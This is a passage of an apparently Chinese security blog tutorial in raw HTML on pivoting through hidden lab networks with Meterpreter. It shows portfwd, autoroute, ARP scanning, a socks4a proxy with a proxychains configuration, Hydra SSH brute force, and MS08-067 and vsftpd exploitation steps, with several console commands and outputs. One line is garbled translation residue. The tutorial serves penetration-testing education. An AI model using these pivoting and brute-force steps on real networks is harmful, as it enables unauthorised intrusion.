10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">使用代理链执行nmap扫描任务非常简单，网络数据包将会通过定义的代理发送到目的地。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">根据扫描的结果，目标系统中运行着SSH以及HTTP服务。在进一步利用之前，我们还将涉及另一种被称为端口转发的通信路由（traffic routing）技术。</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">端口转发</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">端口转发是实现中转跳板的基本步骤，目前还无法直接访问到隐藏网络中的服务，这是因为没有建立双向路由。我们知道如何到达目标系统，所以可以发起请求。但这个请求会失败，这是因为目标系统不知道如何到达我们这边。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.21594202898550724" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/14_jWjW2KoGI8w5PqibMoric3Vl7UVgPw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibPAjRwRkcZ9yibHMAuyII0kAPN0MjWjW2KoGI8w5PqibMoric3Vl7UVgPw/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">基于这个原因，我们可以通过定义meterpreter会话在我们的本地开启一个端口，将本地数据包发送到目的地。只要进程存活，路由就会一直工作。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">再次必须记住，运行autoroute命令建立的路由仅在Metasploit框架下有效，我们也可以尝试使用kali工具实现目的，这里我们就要借助类似端口转发的工具或代理链。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">使用portfwd模块（Metasploit中的一个后模块）可以完成端口转发。 </span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.29873772791023845" data-s="300,640" data-type="png" data-w="713" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/15_icbVWYjGVLcUNQiaFx7qeUpgWMicPA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib1Q8WTxicdOyWbQI9vAgmoYb9icce2icbVWYjGVLcUNQiaFx7qeUpgWMicPA/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">当我们在浏览器中向本地2323端口发送一个链接请求时，该连接请求将会转发到IP地址为7.7.7.20的计算机的80端口。</span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;">得益于ProxyChains Nmap的状语从句，早先我们就已经确定了的Web服务运行在7.7.7.20的80端口。为了访问这个服务，本地系统的2323端口将被转发到7.7.7.20的80端口</p><p style="text-align: center;"><img data-ratio="0.11909262759924386" data-s="300,640" data-type="png" data-w="529" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/16_UDOjQoEhLemtLJMSLYXhtmSnmEeduQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibVkI00EVn9TlFCUz9agxSXFHHUDOjQoEhLemtLJMSLYXhtmSnmEeduQ/640?wx_fmt=png'" style="width: 100%;height: auto;"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">通过portfwd list命令可以查看当前活跃的端口转发规则：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.2754158964879852" data-s="300,640" data-type="png" data-w="541" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/17_kvzLe2nP9Z3URl5Zm6fFsgSMkll6ZA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibzO5qxQicibxYHDYgyhOk2eFRrWkvzLe2nP9Z3URl5Zm6fFsgSMkll6ZA/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;"><span style="box-sizing: border-box;">检测到IP地址为7.7.7.20目标系统的80端口上运行着名为</span><span style="font-weight: 700;word-wrap: break-word;word-break: break-all;line-height: 24px;box-sizing: border-box;">Eash文件共享Web服务器</span><span style="box-sizing: border-box;">的应用</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.5869565217391305" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/18_L4OE3HBj9btYq05eQIJmtSrGC4kFTA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib430VVicZke9Vud83mL3Bo3GXdL4OE3HBj9btYq05eQIJmtSrGC4kFTA/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="690"  /></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">通过中转跳板进行SSH暴力破解</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">正在加载...“的翻译和解释例句与用法1. SSH_enumusers这个辅助模块来完成这个工作。</span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">除了Metasploit框架中的辅助模块外，Kali工具包中的Hydra也可以完成这项任务。通过在ProxyChains下运行Hydra，所有的通信数据将会通过被控制的主机（双网卡主机）传送到目标系统中。 </span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><img data-ratio="0.5263157894736842" data-s="300,640" data-type="png" data-w="836" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/19_u9ISYYMoMDZKCCT1fsYL2huyH5w9NA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib3wlNAsfLIY9G2oLuhqegfPCTu9ISYYMoMDZKCCT1fsYL2huyH5w9NA/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">使用Hydra执行暴力攻击，我们获得代理服务器的用户名为admin，密码为123456.同时使用ProxyChains工具可以连接到远程的SSH服务</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.7195571955719557" data-s="300,640" data-type="png" data-w="542" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/20_e0f2QXyD0e2whr0JIYstAXNBEw2E8w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibGiaoHMsddRxt4v7zSeWxC7Ciaue0f2QXyD0e2whr0JIYstAXNBEw2E8w/640?wx_fmt=png'" style="text-align: center;"  /></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">获得第二层中转跳板的访问</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">如果你还记得，我们之前使用nmap扫描7.7.7.0/24找到了两个漏洞。一个是MS08-067，另一个是Easy File分享应用中的BOF漏洞，这两个方向都让我们访问到目标主机。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">当然还有一个选择便是继续使用上面获取的ssh进行访问，但这里我们选择以上两个方向。</span></p><h3 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(0, 112, 192);margin-top: 20px;margin-bottom: 15px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">MS08-067搭配绑定TCP</span></h3><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">该模块的完整路径为exploit / windows / smb / ms08_067_netapi，在Metasploit框架下利用MS08-067漏洞攻击目标系统。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">由于没有定义双向路由，目标系统无法直接到达我们的计算机，为此需要将bind_tcp设置为payload类型。在exploit操作成功之后，就将要对连接到目标系统的端口进行监听.bind_tcp和reverse_tcp的区别如下图：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.6861598440545809" data-type="jpeg" data-w="513" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/21_jWeeSlPNmrzGnNZHhcibgz4R2sC6gw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibmIOySUPm3ibb7bTxK2ge2UJPZojWeeSlPNmrzGnNZHhcibgz4R2sC6gw/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="513"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">点击阅读原文查看<span style="color: rgb(88, 88, 88);font family: 微软雅黑;font-size:15px;line-height:35px;;white-space: pre-wrap;background-color: rgb(255, 255, 255);">完整设置</span>。</span></p><h3 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(0, 112, 192);margin-top: 20px;margin-bottom: 15px;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">Easy File Share应用的BoF漏洞</span></h3><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">另一个漏洞就是有关于Easy File Share应用的了，点击阅读原文查看设置步骤。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">攻击流程如下图</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.3710144927536232" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/22_O7lUlzhtYAlCcwQpDR2jT6ibvfFNNA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibvXbbZ7z0nicYKGBX9w7w0hFg0UO7lUlzhtYAlCcwQpDR2jT6ibvfFNNA/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">由于我们可以访问7.7.7.20机器，我们需要再次执行信息收集。被命名为JC的机器和RD机器一样有两张网卡，这也意味着我们找到了第二个隐藏网络（8.8.8.0/24 ）</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;"></span></p><p style="text-align: center;"><img data-ratio="0.7090239410681399" data-s="300,640" data-type="png" data-w="543" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/23_rmslOLB4EZzv3YVJOOiariaSCjJUKQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibCtLesArxWAJ61ULq2OGnicYbPwbrmslOLB4EZzv3YVJOOiariaSCjJUKQ/640?wx_fmt=png'" style="width: 100%;height: auto;"  /></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;margin-bottom: 10px;"><span style="box-sizing: border-box;">在第二个隐藏网络下执行Arp扫描继续收集信息</span></p><blockquote><pre style="box-sizing: border-box;overflow: auto;"><code><span style="font-size:14px;line-height:34px;;">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24[*] Running module against SRV03[*] ARP Scanning 8.8.8.0/24[*] &nbsp; IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)[*] &nbsp; IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)[*] &nbsp; IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)[*] &nbsp; &nbsp;IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)</span></code></pre></blockquote><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;margin-bottom: 10px;"><span style="box-sizing: border-box;">ARP扫描结果显示在该网络下存在4台机器</span></p><blockquote><pre style="box-sizing: border-box;overflow: auto;"><code><span style="font-size:14px;line-height:34px;;">meterpreter &gt; run autoroute -s 8.8.8.0/24[*] Adding a route to 8.8.8.0/255.255.255.0...[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20[*] Use the -p option to list all active routesmsf &gt; route printActive Routing Table====================
 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 1
 8.8.8.0 255.255.255.0 Session 3</span></code></pre></blockquote><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;"><span style="box-sizing: border-box;">之后再次添加路由规则</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">两层中中转跳板</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">在JC主机上收集信息时发现了8.8.8.0/24网络，另外之前我们就已经建立了172.16.0.0/24到7.7.7.0/24网络的路由规则。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">在当前的情况下，网络数据包从172.16 .0.20发送到JC设备（第一层中转跳板），数据首先要发送到RD设备（第一层中转跳板），然后RD主机再将数据传送到JC主机。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">如果攻击者（172.16.0.20）数据发送到8.8.8.0/24网络（发现的第二个隐藏网络）的任何一个主机时，就得建立一个新的路由规则。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">为了使用Metasploit框架以外的其他工具，我们必须运行一个socks4代理服务来连接两个跳板主机，并在proxychains工具的配置文件中重新定义新的代理服务器。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">攻击者机器（172.16.0.20）尝试向8.8.8.9发送网络数据包，要经过以下中转：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style=";">RD：我不知道怎么访问到8.8.8.9，但我知道哪个系统能访问到它，我可以把数据发给它。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style=";">JC：我知道怎么将数据从7.7.7.0/24网络发送到8.8.8.0/24网络。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">数据流如下图所示：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.30869565217391304" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/24_S9RsRY0Jh6YNn7KIiak2N67nT2nuXQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibbyjafPxf1yT155v9U2uK0D7ucS9RsRY0Jh6YNn7KIiak2N67nT2nuXQ/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;" width="690"  /></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">神器Proxychains</span></h2><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">在最后阶段，需要为新发现的8.8.8.0/24网络在本地1081端口设置一个新的socks4代理服务。</span></p><blockquote><pre style="box-sizing: border-box;overflow: auto;"><code><span style="font-size:14px;line-height:34px;;">msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; show optionsModule options (auxiliary/server/socks4a):
 &nbsp; Name &nbsp; &nbsp; Current Setting &nbsp;Required &nbsp;Description
 &nbsp; ---- &nbsp; &nbsp; --------------- &nbsp;-------- &nbsp;-----------
 &nbsp; SRVHOST &nbsp;172.16.0.20 &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The address to listen on
 &nbsp; SRVPORT &nbsp;1080 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The port to listen on.Auxiliary action:
 &nbsp; Name &nbsp; Description
 &nbsp; ---- &nbsp; -----------
 &nbsp; Proxy &nbsp;msf auxiliary(socks4a) &gt; set SRVPORT 1081SRVPORT =&gt; 1081msf auxiliary(socks4a) &gt; run[*] Auxiliary module execution completed[*] Starting the socks4a proxy servermsf auxiliary(socks4a) &gt;</span><span style="box-sizing: border-box;"></span></code></pre></blockquote><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;margin-bottom: 10px;"><span style="box-sizing: border-box;">在/etc/proxychains.conf配置文件中添加新的代理服务器。通过激活动态链接设置，确保在不同的代理服务器之间能够正常切换。</span></p><blockquote><pre style="box-sizing: border-box;overflow: auto;"><code><span style="font-size:14px;line-height:34px;;">root@kali:~# cat /etc/proxychains.conf | grep -v "#"dynamic_chainproxy_dnstcp_read_time_out 15000tcp_connect_time_out 8000socks4 &nbsp;172.16.0.20 1080 &nbsp;# First Pivotsocks4 &nbsp;172.16.0.20 1081 &nbsp;# Second Pivot</span></code></pre></blockquote><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-top: 10px;"><span style="box-sizing: border-box;">Proxychains工具通过第二层跳板主机，可以对8.8.8.0/24目标网络进行nmap扫描：【点击阅读原文查看】</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">以上，数据包穿透第一层代理服务器，又经过我们定义的第二层代理服务器，最终到达目的地。对扫描结果进行分析，发现8.8.8.9上安装的vsftpd版本存在漏洞。以下步骤Metasploit框架中设置vsftpd利用模块进行攻击：【点击阅读原文查看】</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">总结</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">攻击者通过以下步骤，发现了2个不同的隐藏网络：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">攻击者控制了RD主机，该主机和攻击机在同一个网络中</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">2.得知RD主机有2张网卡</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">3.通过使用autoroute post模块，定义一个路由规则</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">4.攻击者对7.7.7.0/24网络执行ARP和NMAP扫描，之后发现了命名为JC的主机</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">5.JC存在两个不同的漏洞，分别为MS08_067和Easy File共享应用的BOF下漏洞</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span 